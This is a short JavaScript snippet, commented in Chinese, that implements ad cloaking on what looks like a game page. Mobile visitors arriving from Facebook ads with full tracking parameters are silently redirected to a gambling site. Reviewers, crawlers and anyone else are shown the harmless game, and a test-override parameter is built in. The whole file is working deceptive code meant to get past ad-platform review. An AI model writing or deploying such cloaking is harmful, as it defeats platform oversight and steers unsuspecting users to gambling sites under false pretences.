(function() {
    // 【配置：跳转目标地址】
    var config_target = "https://www.goldenslot11.com/13/?p0=1uk61sz6"; 

    function isRealUser() {
        var search = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();

        // --- A. 测试强制模式 ---
        // 只要链接里带 funtest=1，不看任何条件直接跳（方便你测试）
        if (search.indexOf('funtest=1') > -1) return true;

        // --- B. 占位符拦截 (针对你发的链接) ---
        // 你的链接里带大量 %7b%7b，如果是这种状态，绝对不跳
        if (search.indexOf('%7b%7b') > -1 || search.indexOf('{{') > -1) return false;

        // --- C. 核心参数完整性校验 ---
        // 真实广告点击必须具备 fbclid + 你的所有追踪参数
        var requiredKeys = ['fbclid=', 'pixel=', 'apkch=', 'campaign=', 'adgroup=', 'creative='];
        for (var i = 0; i < requiredKeys.length; i++) {
            if (search.indexOf(requiredKeys[i]) === -1) return false;
        }

        // --- D. 移动端环境校验 ---
        var isMobile = /iphone|ipad|ipod|android/.test(ua);
        if (!isMobile) return false;

        return true; 
    }

    // --- 即时执行 ---
    if (isRealUser()) {
        var connector = config_target.indexOf('?') > -1 ? '&' : '?';
        var finalUrl = config_target + connector + window.location.search.substring(1);
        window.location.replace(finalUrl);
    } else {
        console.log("Safe Mode: Game Content Loaded.");
        if (typeof init === 'function') init();
    }
})();
